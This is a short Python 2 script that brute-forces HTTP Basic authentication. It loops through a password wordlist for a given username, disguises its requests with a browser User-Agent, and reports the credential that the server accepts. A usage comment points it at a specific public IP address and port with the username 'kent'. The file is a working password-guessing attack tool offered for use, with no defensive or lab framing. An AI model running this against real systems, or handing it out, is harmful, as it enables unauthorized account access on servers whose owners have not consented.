import requests
import json
import base64
import sys

#Example usage: 
#python httpListConnector.py 149.56.111.22:5984/app/_design/example/index.html# kent 10k

host = sys.argv[1]
url = 'http://' + host
uid = sys.argv[2]
wordlist = sys.argv[3]

print '\n===== HTTP/BASIC AUTHENTICATOR ====='
print '----- HOST: ' + host
print '----- UID: ' + uid
print '----- WORDLIST: ' + wordlist + '\n'

with open(wordlist) as f:
	for line in f:
		encStr = base64.b64encode(uid + ':' + line.strip())
		loginHeaders = {'GET': '/HTTP/1.1', 'Host': host, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Authorization': 'Basic ' + encStr}
		
		r = requests.get(url, headers=loginHeaders)
		print r.status_code
		if r.status_code == 200:
			print 'PASSWORD FOUND:'
			print line.strip()

			
			print "\n===== FOUND ====="
			print "uid: ", uid
			print "pass: ", line.strip()

			##LOGOUT AFTER SUCCESS (OPTIONAL, PROBABLY NOT PORTABLE)
			logoutHeaders = {'GET': '/Logout.asp /HTTP/1.1', 'Host': host, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Authorization': 'Basic ' + encStr}
			r = requests.get(url, headers=logoutHeaders)
			r = requests.get(url)
			if r.status_code == 401:
				print 'SUCCESSFULLY LOGGED OUT'
			else:
				print "UNABLE TO LOG OUT"
			break
		else:
			print r, line.strip()